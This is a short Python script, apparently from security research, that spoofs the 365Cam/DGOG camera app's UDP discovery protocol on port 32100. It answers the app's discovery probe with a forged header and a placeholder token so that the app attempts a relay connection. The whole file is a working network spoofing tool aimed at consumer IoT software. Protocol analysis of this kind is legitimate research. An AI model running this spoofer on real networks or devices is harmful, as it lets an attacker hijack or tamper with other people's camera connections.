#!/usr/bin/env python3
"""
Spoof a 365Cam/DGOG discovery response to trick the Android app
into attempting a relay connection, which will trigger PPCS_Write.

The discovery protocol:
  Client -> Server: 2c8ab914 (4 bytes, UDP 32100)
  Server -> Client: 2c8b8217 + token (20 bytes total)

We listen for the discovery probe from ANY IP, then respond with a
fake token that will make the app try to connect to the relay.
"""

import socket
import struct
import time

DISCOVERY_PORT = 32100
RESPONSE_HEADER = bytes.fromhex('2c8b8217')

# Create a fake 16-byte token after the 4-byte header
# The real token is 20 bytes = header(4) + token_data(16)
# Token format (from analysis): device_id(?) + session_token(?) + ip/port(?)
# Let's craft a minimal token that the app will accept
FAKE_TOKEN_DATA = bytes([
    0x00, 0x01, 0x02, 0x03,  # Maybe device id prefix
    0x04, 0x05, 0x06, 0x07,  # 
    0x08, 0x09, 0x0a, 0x0b,  # session info
    0x0c, 0x0d, 0x0e, 0x0f,  #
])

FAKE_RESPONSE = RESPONSE_HEADER + FAKE_TOKEN_DATA

def spoof_discovery():
    """Listen for discovery probes and respond with fake tokens."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', DISCOVERY_PORT))
    sock.settimeout(60)
    
    print(f"[*] Listening for discovery probes on UDP {DISCOVERY_PORT}...")
    print(f"[*] Will respond with fake token to trigger relay connection")
    
    while True:
        try:
            data, addr = sock.recvfrom(1024)
            print(f"[+] Received {len(data)} bytes from {addr[0]}:{addr[1]}")
            print(f"    Data: {data.hex()}")
            
            if data[:4] == bytes.fromhex('2c8ab914'):
                print(f"[*] Discovery probe detected! Sending spoofed response...")
                sock.sendto(FAKE_RESPONSE, addr)
                print(f"[+] Response sent: {FAKE_RESPONSE.hex()}")
            else:
                print(f"    Not a discovery probe, ignoring")
                
        except socket.timeout:
            print("[*] Timeout, no probes received in 60s")
            break
        except KeyboardInterrupt:
            break
    
    sock.close()

if __name__ == '__main__':
    spoof_discovery()
